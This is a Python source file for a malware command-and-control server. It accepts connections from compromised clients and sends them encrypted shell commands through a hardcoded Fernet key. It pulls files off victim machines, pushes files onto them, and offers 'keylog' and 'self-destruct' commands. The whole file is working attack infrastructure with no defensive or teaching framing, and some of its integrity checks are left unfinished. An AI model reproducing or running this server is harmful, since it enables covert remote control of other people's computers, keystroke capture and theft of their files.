import socket
import os
import base64
import threading
import hashlib
from cryptography.fernet import Fernet
import logging

# Server configuration
SERVER_HOST = "127.0.0.1"  # Update to your IP address
SERVER_PORT = 5000
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

# Generate or use a key for AES encryption (should be shared between client and server)
key = b'_CiQOJse0uWP9nIP0cC0KiCJI9TMaJGwmCHfukyUG6c=' # Make sure this key matches the client key
cipher = Fernet(key)

# Configure logging
logging.basicConfig(filename='c2server.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Handling each client in a separate thread
def handle_client(client_socket, client_address):
    logging.info(f"[+] {client_address} connected.")
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    logging.info(f"[+] Current working directory: {cwd}")

    while True:
        try:
            # Get the command from the user
            command = input(f"{cwd}>>> ")

            if not command.strip():
                continue

            # Encrypt the command and send it
            encrypted_command = cipher.encrypt(command.encode())
            client_socket.send(encrypted_command)

            if command.lower() == "exit":
                break
            elif command.lower().startswith("download"):
                download_file(client_socket, command.split()[1])
            elif command.lower().startswith("upload"):
                upload_file(client_socket, command.split()[1])
            elif command.lower() == "self-destruct":
                break
            elif command.lower() == "clients":
                print(client_address)
            elif command.lower().startswith("keylog"):
                logging.info("[*] Keylogger started.")
            elif command.lower().startswith("help"):
                print("Available commands:")
                print("download <file_path>")
                print("upload <file_path>")
                print("keylog")
                print("self-destruct")
                print("exit")
            else:
                # Receive encrypted response and decrypt it
                encrypted_output = client_socket.recv(BUFFER_SIZE)
                output = cipher.decrypt(encrypted_output).decode()
                results, cwd = output.split(SEPARATOR)
                print(results)
                logging.info(f"Command executed: {command}, Output: {results}")

        except Exception as e:
            logging.error(f"Error: {str(e)}")
            break

    client_socket.close()

# File download function with hash validation
def download_file(client_socket, filename):
    try:
        with open(filename, "wb") as f:
            file_hash = hashlib.md5()  # Using MD5 for file integrity check
            while True:
                data = client_socket.recv(BUFFER_SIZE)
                if data == b"<END>":
                    break
                f.write(data)
                file_hash.update(data)
        logging.info(f"[+] File {filename} downloaded successfully.")
        print(f"[+] File {filename} downloaded successfully.")
    except Exception as e:
        logging.error(f"Error downloading file: {str(e)}")

# File upload function with hash validation
def upload_file(client_socket, filename):
    if os.path.exists(filename):
        file_hash = hashlib.md5()
        with open(filename, "rb") as f:
            while chunk := f.read(BUFFER_SIZE):
                client_socket.send(chunk)
                file_hash.update(chunk)
        client_socket.send(b"<END>")
        logging.info(f"[+] File {filename} uploaded successfully.")
    else:
        logging.error(f"File {filename} not found.")
        print(f"File {filename} not found.")

# Start server and handle multiple clients with threads
def start_server():
    server_socket = socket.socket()
    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    logging.info(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}...")

    while True:
        client_socket, client_address = server_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

if __name__ == "__main__":
    start_server()

